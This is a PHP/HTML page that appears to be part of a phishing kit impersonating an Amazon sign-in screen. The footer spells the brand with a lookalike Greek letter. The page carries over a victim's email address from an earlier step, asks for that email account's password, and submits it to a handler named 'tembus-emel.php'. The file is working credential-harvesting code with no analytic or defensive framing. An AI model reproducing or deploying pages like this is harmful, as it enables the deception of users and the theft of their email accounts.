<?php
    session_start();
    include('__CONFIG__.php');
    include 'bahasa.php';
    $_SESSION['EM'] = $_POST['EM'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="Library/Bootstrap/css/main.min.css">
    <link rel="stylesheet" href="Sheets/index.css">
    <link rel="shortcut icon" href="assets/img/favicon.ico" />
    <title><?php echo $vea ?></title>
</head>
<body>
    <!-- Logo Navbar-->
    <a href="#" class="navbrand text-center mt-3">
        <span class="aicon alogo"></span>
    </a>

    <div class="form">
        <div class="container-fluid">
            <div class="myform">
            <form action="Actions/tembus-emel.php" method="post">
                <h1 class="colorblacked"><?php echo $veaa ?></h1>
                <p style="font-size:14px"><?php echo $tvys ?></p>
                <div class="form-group mt-14px">
                    <label for="textemail" class="emailorphone"><?php echo $enpas ?></label>
                    <input type="password" name="EPW" class="form-control" id="textemail" required>
                </div>
                <button type="submit" name="Sex" class="btn bgcolored mt-6px"><?php echo $ver ?></button>
                <br>
                <br>
                <a href="Thanks.php"><?php echo $scp ?></a>
            </form>
            </div>
        </div>
    </div>

    <div class="myhr"></div>

    <div class="footer">
        <ul class="nav  justify-content-center">
            <li class="nav-item">
              <a class="nav-link mylinke" href="#">Conditions of Use</a>
            </li>
            <li class="nav-item">
              <a class="nav-link mylinke" href="#">Privacy Notice</a>
            </li>
            <li class="nav-item">
                <a class="nav-link mylinke" href="#">Help</a>
            </li>
        </ul>
        <p class="footertext text-center">© 1996- <?php echo date('Y'); ?>, Αmazon. com, Inc. or its affiliates</p>
    </div>

    <script src="Library/jQuery/main.min.js"></script>
    <script src="Library/pooper/main.min.js"></script>
    <script src="Library/Bootstrap/js/main.min.js"></script>
</body>
</html>